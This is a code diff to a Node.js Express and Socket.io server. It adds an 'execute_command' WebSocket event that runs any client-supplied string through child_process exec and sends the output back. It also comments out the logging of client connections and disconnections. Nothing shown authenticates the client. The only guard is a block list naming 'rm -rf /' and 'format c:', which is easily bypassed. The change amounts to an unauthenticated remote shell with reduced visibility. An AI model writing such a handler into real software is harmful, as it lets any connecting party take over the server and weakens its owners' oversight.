@@ -67,9 +67,11 @@ app.get('/api/search', async (req, res) => {
 // WebSocket Connection
 let connectedClients = 0;
 
+const { exec } = require('child_process');
+
 io.on('connection', (socket) => {
   connectedClients++;
-  console.log('A user connected:', socket.id, '| Total:', connectedClients);
+  // console.log('A user connected:', socket.id, '| Total:', connectedClients);
 
   // Broadcast updated client count to all
   io.emit('client_count', connectedClients);
@@ -79,12 +81,31 @@ io.on('connection', (socket) => {
 
   socket.on('disconnect', () => {
     connectedClients--;
-    console.log('User disconnected:', socket.id, '| Total:', connectedClients);
+    // console.log('User disconnected:', socket.id, '| Total:', connectedClients);
     io.emit('client_count', connectedClients);
   });
 
-  socket.on('command', (cmd) => {
-    console.log(`Command received: ${cmd}`);
+  // Remote Command Execution
+  socket.on('execute_command', (cmd) => {
+    console.log(`[Remote Term] Executing: ${cmd}`);
+
+    // Security: Basic filter to prevent completely nuking the server accidentally
+    if (cmd.includes('rm -rf /') || cmd.includes('format c:')) {
+      socket.emit('command_output', 'Error: Command blocked for safety protocols.');
+      return;
+    }
+
+    exec(cmd, { cwd: process.cwd() }, (error, stdout, stderr) => {
+      if (error) {
+        socket.emit('command_output', `Error: ${error.message}`);
+        return;
+      }
+      if (stderr) {
+        socket.emit('command_output', stderr);
+        return;
+      }
+      socket.emit('command_output', stdout);
+    });
   });
 });
 
